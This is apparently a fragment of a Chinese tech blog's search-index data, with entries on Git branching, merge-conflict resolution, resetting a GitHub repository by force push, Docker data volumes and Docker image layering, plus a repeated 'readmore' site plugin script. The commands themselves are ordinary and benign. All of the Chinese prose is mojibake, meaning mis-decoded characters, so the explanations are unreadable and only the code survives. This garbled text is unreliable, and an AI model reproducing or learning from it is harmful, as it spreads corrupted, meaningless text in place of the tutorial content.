æ‹‰å–ç‰¹å®šçš„è¿œç¨‹åˆ†æ”¯ï¼Œä¾‹å¦‚checkoutè¿œç¨‹çš„origin/devåˆ†æ”¯ï¼Œå¹¶åœ¨æœ¬åœ°å°†å…¶å‘½åä¸ºdevåˆ†æ”¯ï¼ŒåŒæ—¶åˆ‡æ¢åˆ°æœ¬åœ°çš„devåˆ†æ”¯$ git checkout -b dev origin/dev# åˆ‡æ¢å›masteråˆ†æ”¯$ git checkout master æ¸…ç©º Github ç‰¹å®šçš„ä»“åº“æ¸…ç©º Github ç‰¹å®šçš„ä»“åº“ï¼Œè€Œä¸æ˜¯åˆ é™¤å¹¶é‡æ–°åˆ›å»ºä»“åº“ï¼ŒåŒæ—¶ä¿ç•™æœ¬åœ°ä»“åº“åŸæ¥çš„æ‰€æœ‰æ–‡ä»¶ã€‚ 12345678910111213141516171819# åˆ›å»ºä¸´æ—¶çš„ä»“åº“ç›®å½•ï¼ˆä¿è¯ä¸å¯¹æœ¬åœ°ä»“åº“åŸæ¥çš„æ–‡ä»¶è¿›è¡Œä»»ä½•æ“ä½œï¼‰$ mkdir -p /tmp/reset-repo# è¿›å…¥ä¸´æ—¶ä»“åº“ç›®å½•$ /tmp/reset-repo# åˆ›å»ºREADME.mdï¼ˆå¿…é¡»å¾—æœ‰ä¸€ä¸ªæ–‡ä»¶ï¼‰$ touch README.md# åˆå§‹åŒ–Git$ git init$ git add .$ git commit -m "Initial commit"# é‡æ–°è®¾ç½®æºä»“åº“çš„åœ°å€$ git remote add origin git@github.com:&lt;YOUR ACCOUNT&gt;/&lt;YOUR REPOS&gt;.git# é‡æ–°Pushåˆ°æºä»“åº“ï¼ˆè¿™é‡Œæ¼”ç¤ºä½¿ç”¨çš„æ˜¯masteråˆ†æ”¯ï¼‰$ git push -u --force origin master .gitignore å¸¸ç”¨æ¨¡æ¿ .gitignore å¸¸ç”¨æ¨¡æ¿ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶"},{title:"Git ä¹‹ä¸‰ - åˆ†æ”¯ç®¡ç†",url:"/posts/501d8c1.html",text:'Git å¸¸è§çš„åˆ†æ”¯æ¨¡å‹ Git åˆ†æ”¯ç®¡ç†å›¾è§£ Git åˆ†æ”¯çš„åˆ›å»ºã€åˆ é™¤ã€åˆ‡æ¢ 1234567891011121314# æŸ¥çœ‹å½“å‰çš„åˆ†æ”¯åˆ—è¡¨$ git branch -v# åˆ›å»ºåˆ†æ”¯$ git branch hot_fix# åˆ é™¤æŸä¸ªåˆ†æ”¯$ git branch -d hot_fix# åˆ‡æ¢åˆ°æŸä¸ªåˆ†æ”¯$ git checkout hot_fix# ä¸€æ­¥å®Œæˆåˆ›å»ºå¹¶åˆ‡æ¢åˆ†æ”¯$ git checkout -b hot_fix Git åˆ†æ”¯çš„åˆå¹¶ 1234567# æ¼”ç¤ºå°†hot_fixåˆ†æ”¯åˆå¹¶åˆ°masteråˆ†æ”¯# ç¬¬ä¸€æ­¥ï¼Œåˆ‡æ¢åˆ°æ¥æ”¶ä¿®æ”¹çš„åˆ†æ”¯ï¼ˆå³å‡†å¤‡å¢åŠ æ–°å†…å®¹çš„åˆ†æ”¯ï¼‰ä¸Š$ git checkout master# ç¬¬äºŒæ­¥ï¼Œåˆå¹¶åˆ†æ”¯$ git merge hot_fix Git è§£å†³åˆå¹¶åˆ†æ”¯åäº§ç”Ÿçš„å†²çª 123456789101112131415161718192021# æ¼”ç¤ºå°†masteråˆ†æ”¯åˆå¹¶åˆ°hot_fixåˆ†æ”¯ï¼Œå¹¶è§£å†³åˆå¹¶åäº§ç”Ÿçš„å†²çª# åˆ‡æ¢åˆ°hot_fixåˆ†æ”¯$ git checkout hot_fix# åˆå¹¶masteråˆ†æ”¯ï¼Œgitè¾“å‡ºäº†åˆå¹¶å†²çªçš„æç¤ºä¿¡æ¯$ git merge master&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADedit by hot_fix s=======edit by hot_fix2&gt;&gt;&gt;&gt;&gt;&gt;&gt; master# ç¬¬ä¸€æ­¥ï¼Œæ‰‹åŠ¨ç¼–è¾‘äº§ç”Ÿå†²çªçš„æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œç›´è‡³å†²çªçš„æ–‡ä»¶å†…å®¹éƒ½ä¿®æ”¹æ‰$ vim api.json# ç¬¬äºŒæ­¥ï¼Œæ ‡è®°å†²çªå·²è§£å†³ï¼Œå°†ä¹‹å‰äº§ç”Ÿå†²çªçš„æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒº$ git add api.json# ç¬¬ä¸‰æ­¥ï¼Œæäº¤ä¿®æ”¹ï¼Œæ­¤æ—¶commitå‚æ•°ä¸èƒ½å¸¦å…·ä½“æ–‡ä»¶å$ git commit -m \'update message\' å…‹éš†æŒ‡å®šåˆ†æ”¯çš„ä»£ç  12# é€šè¿‡ -b å‚æ•°æŒ‡å®šåˆ†æ”¯ï¼Œé»˜è®¤æ˜¯masteråˆ†æ”¯$ git clone -b develop https://github.com/xxx.git var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶"},{title:"Docker ä¹‹äº” Docker æ•°æ®å·ä¸æ•°æ®å·å®¹å™¨",url:"/posts/ab1aba7d.html",text:'å‰è¨€ å®¹å™¨åœ¨è¿è¡ŒæœŸé—´äº§ç”Ÿçš„æ•°æ®ä¸ä¼šå†™åœ¨é•œåƒé‡Œé¢ï¼Œé‡æ–°ç”¨æ­¤é•œåƒåˆ›å»ºå¹¶å¯åŠ¨æ–°çš„å®¹å™¨å°±ä¼šåˆå§‹åŒ–é•œåƒï¼ŒåŠ ä¸€ä¸ªå…¨æ–°çš„å®¹å™¨å¯å†™å±‚æ¥ä¿å­˜æ•°æ®ã€‚ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ Docker çš„è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€éœ€è¦å¯¹æ•°æ®è¿›è¡ŒæŒä¹…åŒ–ï¼Œæˆ–è€…éœ€è¦åœ¨å¤šä¸ªå®¹å™¨ä¹‹é—´è¿›è¡Œæ•°æ®å…±äº«ï¼ŒDocker æä¾›æ•°æ®å·å’Œæ•°æ®å·å®¹å™¨æ¥è§£å†³ï¼›å¦å¤–è¿˜å¯ä»¥é€šè¿‡ commit æäº¤ä¸€ä¸ªæ–°çš„é•œåƒæ¥ä¿å­˜äº§ç”Ÿçš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ â€œdocker cpâ€ å‘½ä»¤åœ¨å®¿ä¸»æœºä¸å®¹å™¨ä¹‹é—´äº’ç›¸æ‹·è´æ•°æ®æ–‡ä»¶ã€‚ å®¹å™¨ä¸­ç®¡ç†æ•°æ®ä¸»è¦çš„ä¸¤ç§æ–¹å¼ æ•°æ®å·ï¼ˆData Volumesï¼‰ï¼šå®¹å™¨å†…æ•°æ®ç›´æ¥æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºç¯å¢ƒã€‚æ•°æ®å·å®¹å™¨ï¼ˆData Volume Containersï¼‰ï¼šä½¿ç”¨ç‰¹å®šå®¹å™¨ç»´æŠ¤æ•°æ®å·ã€‚ æ•°æ®å·çš„åŠŸèƒ½ä»‹ç» ç»•è¿‡ â€œå†™æ—¶å¤åˆ¶â€ ç³»ç»Ÿï¼Œä»¥è¾¾åˆ°æœ¬åœ°ç£ç›˜ IO çš„æ€§èƒ½ã€‚ ç»•è¿‡ â€œå†™æ—¶å¤åˆ¶â€ ç³»ç»Ÿï¼Œæœ‰äº›æ–‡ä»¶ä¸éœ€è¦åœ¨ docker commit æ‰“åŒ…è¿›é•œåƒæ–‡ä»¶ã€‚ å®ç°å®¹å™¨å†…éƒ¨æ•°æ®çš„æŒä¹…åŒ–ã€‚ æ•°æ®å·å¯ä»¥åœ¨å®¹å™¨é—´å…±äº«å’Œé‡ç”¨æ•°æ®ã€‚ æ•°æ®å·å¯ä»¥åœ¨å®¿ä¸»æœºå’Œå®¹å™¨é—´å…±äº«æ•°æ®ã€‚ æ•°æ®å·æ•°æ®æ”¹å˜æ˜¯ç›´æ¥ä¿®æ”¹çš„ã€‚ æ•°æ®å·æ˜¯æŒç»­æ€§çš„ï¼Œç›´åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä»¬ï¼›å³ä¾¿æ˜¯åˆå§‹çš„æ•°æ®å·å®¹å™¨æˆ–ä¸­é—´å±‚çš„æ•°æ®å·å®¹å™¨åˆ é™¤äº†ï¼Œåªè¦è¿˜æœ‰å…¶ä»–çš„å®¹å™¨ä½¿ç”¨æ•°æ®å·ï¼Œé‚£ä¹ˆé‡Œé¢çš„æ•°æ®éƒ½ä¸ä¼šä¸¢å¤±ã€‚ Docker é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ·»åŠ æ•°æ®å· 1234567891011# åˆ›å»ºå®¿ä¸»æœºçš„æ–‡ä»¶å…±äº«ç›®å½•ï¼Œå³ä½¿ä¸æ‰‹åŠ¨åœ¨å®¿ä¸»æœºä¸Šåˆ›å»ºæ•°æ®å·ç›®å½•ï¼ŒDockerä¹Ÿä¼šè‡ªåŠ¨åˆ›å»º# mkdir -p /host/datavolume# ä¸ºå®¹å™¨æ·»åŠ ä¸€ä¸ªæ•°æ®å·ï¼Œå³å°†å®¿ä¸»æœºçš„/host/datavolumeç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­çš„/datavolumeç›®å½•ï¼Œå®¹å™¨é»˜è®¤å…·æœ‰/datavolumeç›®å½•çš„è¯»å†™æƒé™ï¼Œä»¥ä¸‹å‘½ä»¤çš„ä½œç”¨ç±»ä¼¼Linuxçš„mountå‘½ä»¤# docker run -it -v /host/datavolume:/datavolume --name="cenots7" centos# ä¸ºå®¹å™¨æ·»åŠ ä¸€ä¸ªæ•°æ®å·ï¼ŒåŒæ—¶æŒ‡å®šå®¹å™¨ä»…æ‹¥æœ‰/datavolumeç›®å½•çš„åªè¯»æƒé™# docker run -it -v /host/datavolume:/datavolume:ro --name="cenots7" centos# æŸ¥çœ‹æ•°æ®å·çš„åˆ›å»ºæƒ…å†µ# docker inspect cenots7 Docker é€šè¿‡ç¼–å†™ Dockerfile çš„æ–¹å¼æ·»åŠ æ•°æ®å· 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# åˆ›å»ºDockerfileæ–‡ä»¶ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹æ–‡ä»¶å†…å®¹# vi ~/dockerfileFROM centosVOLUME ["/dataVolume1","//dataVolume2"]CMD /bin/bash# é€šè¿‡dockerfileæ–‡ä»¶æ„å»ºæ–°çš„Dockeré•œåƒï¼Œpeteræ˜¯å‘½åç©ºé—´ï¼Œcentos7æ˜¯æ–°é•œåƒçš„åç§°# docker build -f ~/dockerfile -t peter/centos7 .# æŸ¥çœ‹åˆšæ„å»ºçš„Dockeré•œåƒ# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/centos7 latest e6d3ad991247 50 seconds ago 202MB# åŸºäºåˆšæ„å»ºçš„Dockeré•œåƒï¼Œæ–°å»ºå¹¶å¯åŠ¨å®¹å™¨# docker run -it --name="centos7" peter/centos7# æŸ¥çœ‹å®¹å™¨å†…é€šè¿‡dockerfileæ·»åŠ çš„å®¹å™¨å·# ls -al /drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume1drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume2# æŸ¥çœ‹å®¿ä¸»æœºä¸­æ•°æ®å·çš„æŒ‚è½½ç›®å½•ï¼Œè¯¥æŒ‚è½½ç›®å½•ç”±Dockeråˆ†é…# docker inspect centos7"Mounts": [ { "Type": "volume", "Name": "b6c0574c8e2105ebb736857f050d106dd4d3b35617c40110b69d85c22c900de1", "Source": "/var/lib/docker/volumes/b6c0574c8e2105ebb736857f050d106dd4d3b35617c40110b69d85c22c900de1/_data", "Destination": "/dataVolume2", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" }, { "Type": "volume", "Name": "0ad49fc76fc6af73ebc62efc88c3976cb44edd1b48aed3d26995e7759044972a", "Source": "/var/lib/docker/volumes/0ad49fc76fc6af73ebc62efc88c3976cb44edd1b48aed3d26995e7759044972a/_data", "Destination": "/dataVolume1", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" }] Docker æ•°æ®å·å®¹å™¨çš„ä½¿ç”¨ å®¹å™¨ä¹‹é—´é…ç½®ä¿¡æ¯çš„ä¼ é€’ï¼Œæ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢ï¼›å³ä¾¿æ˜¯åˆå§‹çš„æ•°æ®å·å®¹å™¨æˆ–ä¸­é—´å±‚çš„æ•°æ®å·å®¹å™¨åˆ é™¤äº†ï¼Œåªè¦è¿˜æœ‰å…¶ä»–çš„å®¹å™¨ä½¿ç”¨æ•°æ®å·ï¼Œé‚£ä¹ˆé‡Œé¢çš„æ•°æ®éƒ½ä¸ä¼šä¸¢å¤±ã€‚ 12345678910111213141516171819# é¦–å…ˆåˆ›å»ºDockerfileæ–‡ä»¶# vi ~/dockerfileFROM centosVOLUME ["/dataVolume1","/dataVolume2"]CMD /bin/bash# é€šè¿‡Dockerfileæ–‡ä»¶æ„å»ºæ–°çš„Dockeré•œåƒ# docker build -f ~/dockerfile -t peter/centos7 .# åŸºäºåˆšæ„å»ºçš„Dockeré•œåƒï¼Œæ–°å»ºå¹¶å¯åŠ¨å®¹å™¨# docker run -it --name="centos-1" peter/centos7# åŸºäºä¸Šé¢çš„centos-1å®¹å™¨ï¼Œå†åˆ›å»ºå¦ä¸€ä¸ªå®¹å™¨centos-2ï¼ŒåŒæ—¶æŒ‡å®šcentos-1å®¹å™¨ä½œä¸ºæ•°æ®å·å®¹å™¨# docker run -it --name="centos-2" --volumes-from centos-1 peter/centos7# æŸ¥çœ‹centos-2å®¹å™¨å†…çš„å®¹å™¨å·# ls -al /drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume1drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹å›› Docker é•œåƒç»“æ„ä¸åŠ è½½åŸç†",url:"/posts/eb291124.html",text:'Docker é•œåƒ é•œåƒæ˜¯ä¸€ç§è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œç”¨æ¥æ‰“åŒ…è½¯ä»¶è¿è¡Œç¯å¢ƒå’ŒåŸºäºè¿è¡Œç¯å¢ƒå¼€å‘çš„è½¯ä»¶ï¼ŒåŒ…å«è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼Œå…¶ä¸­åŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶ã€åº“ã€ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶ã€‚ Docker çš„ Base é•œåƒ Base é•œåƒä» scratch æ„å»ºï¼Œä¸ä¾èµ–å…¶ä»–é•œåƒï¼Œå¯ä½œä¸ºå…¶ä»–åº”ç”¨é•œåƒçš„çˆ¶é•œåƒï¼›å…¶ä»–åº”ç”¨é•œåƒå¯ä»¥åœ¨æ­¤åŸºç¡€è¿›è¡Œæ‰©å±•ï¼ŒBase é•œåƒé€šå¸¸éƒ½æ˜¯å„ç§ Linux å‘è¡Œç‰ˆçš„ Docker é•œåƒï¼Œæ¯”å¦‚ Ubuntuã€Debianã€CentOS ç­‰ã€‚ Docker é•œåƒåŠ è½½åŸç† bootfs åœ¨ Docker é•œåƒä¸­æœ€åº•å±‚æ˜¯ bootfs (boot file sysem) æ–‡ä»¶ç³»ç»Ÿï¼Œbootfs ä¸»è¦åŒ…å« bootloader å’Œ kernelã€‚Linux åˆšå¯åŠ¨æ—¶ä¼šåŠ è½½ bootfs æ–‡ä»¶ç³»ç»Ÿï¼Œbootlader ä¸»è¦ä½œç”¨æ˜¯å¼•å¯¼åŠ è½½ kernelã€‚åœ¨ Docker é•œåƒä¸­ï¼Œbootfs è¿™ä¸€å±‚ä¸å…¸å‹çš„ Linux/Unix ç³»ç»Ÿæ˜¯ä¸€æ ·çš„ï¼ŒåŒ…å« bootloader å’Œ kernelã€‚å½“ bootloader åŠ è½½å®Œæˆä¹‹åæ•´ä¸ªå†…æ ¸éƒ½å­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œæ­¤æ—¶å†…å­˜çš„ä½¿ç”¨æƒå·²ç”± bootfs è½¬äº¤ç»™å†…æ ¸ï¼Œæ­¤æ—¶ç³»ç»Ÿä¹Ÿä¼šå¸è½½ bootfsã€‚ rootfs åœ¨ Docker é•œåƒä¸­ç”¨æˆ·ç©ºé—´çš„æ–‡ä»¶ç³»ç»Ÿæ˜¯ rootfsï¼ŒåŒ…å« /devã€/procã€/bin ç­‰ç›®å½•ã€‚å¯¹äº base é•œåƒæ¥è¯´ï¼Œåº•å±‚ç›´æ¥ç”¨ Host çš„ kernelï¼Œè‡ªå·±åªéœ€è¦æä¾› rootfsã€‚è€Œå¯¹äºä¸€ä¸ªç²¾ç®€çš„ OSï¼Œrootfs çš„ä½“ç§¯å¯ä»¥å¾ˆå°ï¼Œåªéœ€è¦åŒ…å«æœ€åŸºæœ¬çš„å‘½ä»¤ã€å·¥å…·å’Œç¨‹åºåº“å°±å¯ä»¥ã€‚ ä¸åŒ Linux å‘è¡Œç‰ˆçš„ä¸»è¦åŒºåˆ«å°±æ˜¯ rootfsã€‚æ¯”å¦‚ Ubuntu14.04 ä½¿ç”¨ upstart ç®¡ç†æœåŠ¡ï¼Œapt ç®¡ç†è½¯ä»¶åŒ…ï¼›è€Œ CentOS7 ä½¿ç”¨ systemd å’Œ yumã€‚è¿™äº›éƒ½æ˜¯ç”¨æˆ·ç©ºé—´ä¸Šçš„åŒºåˆ«ï¼ŒLinux kernel å·®åˆ«ä¸å¤§ã€‚å› æ­¤ Docker å¯ä»¥åŒæ—¶æ”¯æŒå¤šç§å‘è¡Œç‰ˆçš„ Linux é•œåƒï¼Œæ¨¡æ‹Ÿå‡ºå¤šç§æ“ä½œç³»ç»Ÿç¯å¢ƒã€‚ å®¹å™¨åªèƒ½ä½¿ç”¨ Host çš„ kernelï¼Œå¹¶ä¸”ä¸èƒ½ä¿®æ”¹ã€‚æ‰€æœ‰å®¹å™¨éƒ½å…±ç”¨ host çš„ kernelï¼Œåœ¨å®¹å™¨ä¸­æ²¡åŠæ³•å¯¹ kernel å‡çº§ã€‚å¦‚æœå®¹å™¨å¯¹ kernel ç‰ˆæœ¬æœ‰è¦æ±‚ï¼ˆæ¯”å¦‚åº”ç”¨åªèƒ½åœ¨æŸä¸ª kernel ç‰ˆæœ¬ä¸‹è¿è¡Œï¼‰ï¼Œåˆ™ä¸å»ºè®®ç”¨å®¹å™¨ï¼Œè¿™ç§åœºæ™¯è™šæ‹Ÿæœºå¯èƒ½æ›´åˆé€‚ã€‚ å›¾è§£ bootfsã€rootfs UnionFS æ–‡ä»¶ç³»ç»Ÿ ä¸€ç§ä¸º Linuxï¼ŒFreeBSD å’Œ NetBSD æ“ä½œç³»ç»Ÿè®¾è®¡çš„æŠŠå…¶ä»–æ–‡ä»¶ç³»ç»Ÿè”åˆåˆ°ä¸€ä¸ªè”åˆæŒ‚è½½ç‚¹çš„æ–‡ä»¶ç³»ç»ŸæœåŠ¡ã€‚å®ƒä½¿ç”¨ branch æŠŠä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶å’Œç›®å½• â€œé€æ˜åœ°â€ è¦†ç›–ï¼Œå½¢æˆä¸€ä¸ªå•ä¸€ä¸€è‡´çš„æ–‡ä»¶ç³»ç»Ÿã€‚è¿™äº› branches æˆ–è€…æ˜¯ read-only æˆ–è€…æ˜¯ read-write çš„ï¼Œæ‰€ä»¥å½“å¯¹è¿™ä¸ªè™šæ‹Ÿåçš„è”åˆæ–‡ä»¶ç³»ç»Ÿè¿›è¡Œå†™æ“ä½œçš„æ—¶å€™ï¼Œç³»ç»Ÿæ˜¯çœŸæ­£å†™åˆ°äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ä¸­ã€‚çœ‹èµ·æ¥è¿™ä¸ªè™šæ‹Ÿåçš„è”åˆæ–‡ä»¶ç³»ç»Ÿæ˜¯å¯ä»¥å¯¹ä»»ä½•æ–‡ä»¶è¿›è¡Œæ“ä½œçš„ï¼Œä½†æ˜¯å…¶å®å®ƒå¹¶æ²¡æœ‰æ”¹å˜åŸæ¥çš„æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸º unionfs ç”¨åˆ°äº†ä¸€ä¸ªé‡è¦çš„èµ„ç®¡ç®¡ç†æŠ€æœ¯å«å†™æ—¶å¤åˆ¶ã€‚å†™æ—¶å¤åˆ¶ï¼ˆcopy-on-writeï¼‰æŠ€æœ¯ï¼Œä¹Ÿå«éšå¼å…±äº«ï¼Œæ˜¯ä¸€ç§å¯¹å¯ä¿®æ”¹èµ„æºå®ç°é«˜æ•ˆå¤åˆ¶çš„èµ„æºç®¡ç†æŠ€æœ¯ã€‚å®ƒçš„æ€æƒ³æ˜¯ï¼Œå¦‚æœä¸€ä¸ªèµ„æºæ˜¯é‡å¤çš„ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™æ—¶å€™å¹¶ä¸éœ€è¦ç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºï¼›è¿™ä¸ªèµ„æºå¯ä»¥è¢«æ–°æ—§å®ä¾‹å…±äº«ã€‚åˆ›å»ºæ–°èµ„æºå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡å†™æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¯¹èµ„æºè¿›è¡Œä¿®æ”¹çš„æ—¶å€™ã€‚é€šè¿‡è¿™ç§èµ„æºå…±äº«çš„æ–¹å¼ï¼Œå¯ä»¥æ˜¾è‘—åœ°å‡å°‘æœªä¿®æ”¹èµ„æºå¤åˆ¶å¸¦æ¥çš„æ¶ˆè€—ï¼Œä½†æ˜¯ä¹Ÿä¼šåœ¨è¿›è¡Œèµ„æºä¿®æ”¹çš„æ—¶å€™å¢åŠ å°éƒ¨åˆ†çš„å¼€é”€ã€‚ Docker é•œåƒä¸­çš„ UnionFS UnionFS æ–‡ä»¶ç³»ç»Ÿæ˜¯ Docker é•œåƒçš„åŸºç¡€ï¼Œé•œåƒå¯ä»¥é€šè¿‡åˆ†å±‚æ¥è¿›è¡Œç»§æ‰¿ï¼ŒåŸºäº Base é•œåƒï¼ˆæ²¡æœ‰çˆ¶é•œåƒï¼‰ï¼Œå¯ä»¥åˆ¶ä½œå„ç§å…·ä½“çš„åº”ç”¨é•œåƒã€‚ç®€å•æ¦‚æ‹¬æ¥è¯´ï¼ŒUnionFS æ˜¯ä¸€ç§åˆ†å±‚ã€è½»é‡çº§å¹¶ä¸”é«˜æ€§èƒ½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ”¯æŒå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ä½œä¸ºä¸€æ¬¡æäº¤æ¥ä¸€å±‚å±‚åœ°å åŠ ï¼ŒåŒæ—¶å¯ä»¥å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹ã€‚ç‰¹æ€§æ˜¯å¯ä»¥ä¸€æ¬¡åŒæ—¶åŠ è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†ä»å¤–é¢çœ‹èµ·æ¥ï¼Œåªèƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼›è”åˆåŠ è½½ä¼šæŠŠå„å±‚æ–‡ä»¶ç³»ç»Ÿå åŠ èµ·æ¥ï¼Œè¿™æ ·æœ€ç»ˆçš„æ–‡ä»¶ç³»ç»ŸåŒ…å«æ‰€æœ‰åº•å±‚çš„æ–‡ä»¶å’Œç›®å½•ã€‚ å®¹å™¨çš„å¯å†™å±‚ å½“å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¸€ä¸ªæ–°çš„å¯å†™å±‚è¢«åŠ è½½åˆ°é•œåƒçš„é¡¶éƒ¨ã€‚è¿™ä¸€å±‚é€šå¸¸è¢«ç§°ä½œ â€œå®¹å™¨å±‚â€ï¼Œâ€œå®¹å™¨å±‚â€ ä¹‹ä¸‹çš„éƒ½å« â€œé•œåƒå±‚â€ã€‚æ‰€æœ‰å¯¹å®¹å™¨çš„æ”¹åŠ¨ï¼Œæ— è®ºæ·»åŠ ã€åˆ é™¤ã€è¿˜æ˜¯ä¿®æ”¹æ–‡ä»¶éƒ½åªä¼šå‘ç”Ÿåœ¨å®¹å™¨å±‚ä¸­ã€‚å³åªæœ‰å®¹å™¨å±‚æ˜¯å¯å†™çš„ï¼Œå®¹å™¨å±‚ä¸‹é¢çš„æ‰€æœ‰é•œåƒå±‚éƒ½æ˜¯åªè¯»çš„ã€‚å…¶ä¸­é•œåƒå±‚æ•°é‡å¯èƒ½ä¼šå¾ˆå¤šï¼Œæ‰€æœ‰é•œåƒå±‚ä¼šè”åˆåœ¨ä¸€èµ·ç»„æˆä¸€ä¸ªç»Ÿä¸€çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆUnionFSï¼‰ã€‚å¦‚æœä¸åŒé•œåƒå±‚ä¸­æœ‰ä¸€ä¸ªç›¸åŒè·¯å¾„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ /aï¼Œä¸Šå±‚çš„ /a ä¼šè¦†ç›–ä¸‹å±‚çš„ /aï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·åªèƒ½è®¿é—®åˆ°æœ€ä¸Šå±‚ä¸­çš„æ–‡ä»¶ /aã€‚åœ¨å®¹å™¨å±‚ä¸­ï¼Œç”¨æˆ·çœ‹åˆ°çš„æ˜¯ä¸€ä¸ªå åŠ ä¹‹åçš„æ–‡ä»¶ç³»ç»Ÿã€‚ä¸‹å›¾æ˜¯å®¹å™¨å¯å†™å±‚çš„å›¾è§£ï¼š å®¹å™¨å¯å†™å±‚çš„æ“ä½œ æ·»åŠ æ–‡ä»¶ï¼Œåœ¨å®¹å™¨ä¸­åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œæ–°æ–‡ä»¶è¢«æ·»åŠ åˆ°å®¹å™¨å±‚ä¸­ã€‚ è¯»å–æ–‡ä»¶ï¼Œåœ¨å®¹å™¨ä¸­è¯»å–æŸä¸ªæ–‡ä»¶æ—¶ï¼ŒDocker ä¼šä»ä¸Šå¾€ä¸‹ä¾æ¬¡åœ¨å„é•œåƒå±‚ä¸­æŸ¥æ‰¾æ­¤æ–‡ä»¶ã€‚ä¸€æ—¦æ‰¾åˆ°ï¼Œæ‰“å¼€å¹¶è¯»å…¥å†…å­˜ã€‚ ä¿®æ”¹æ–‡ä»¶ï¼Œåœ¨å®¹å™¨ä¸­ä¿®æ”¹å·²å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼ŒDocker ä¼šä»ä¸Šå¾€ä¸‹ä¾æ¬¡åœ¨å„é•œåƒå±‚ä¸­æŸ¥æ‰¾æ­¤æ–‡ä»¶ã€‚ä¸€æ—¦æ‰¾åˆ°ï¼Œç«‹å³å°†å…¶å¤åˆ¶åˆ°å®¹å™¨å±‚ï¼Œç„¶åå†ä¿®æ”¹ã€‚ åˆ é™¤æ–‡ä»¶ï¼Œåœ¨å®¹å™¨ä¸­åˆ 